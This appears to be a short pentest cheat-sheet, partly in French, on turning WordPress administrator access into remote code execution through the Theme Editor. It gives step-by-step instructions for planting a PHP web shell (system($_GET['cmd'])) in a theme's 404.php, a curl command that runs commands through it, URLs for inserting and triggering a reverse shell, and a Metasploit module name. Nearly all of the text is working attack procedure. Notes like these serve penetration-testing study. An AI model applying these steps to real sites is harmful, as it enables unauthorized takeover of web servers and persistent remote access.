Remote Code Execution (RCE) via the Theme Editor

- Log in to WordPress with the administrator credentials

- Go to `Appearance -> Theme Editor`

- Select an inactive theme in order to avoid corrupting the main theme. (`Twenty Seventeen`)

- Next, choose a non-critical file such as `404.php` to modify and add a web shell. such as `system($_GET['cmd']);`

```sh
curl -s -X GET http://target.com/wordpress/wp-content/themes/twentyseventeen/404.php?cmd=id
```

---

Inserer un reverse shell dans le fichier `404.php` 

```h
http://target.com/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen&scrollto=2148
```

Executer le reverse-shell

```sh
http://target.com/wordpress/wp-content/themes/twentyseventeen/404.php
```



## Metaploit

```sh
use exploit/unix/webapp/wp_admin_shell_upload
```
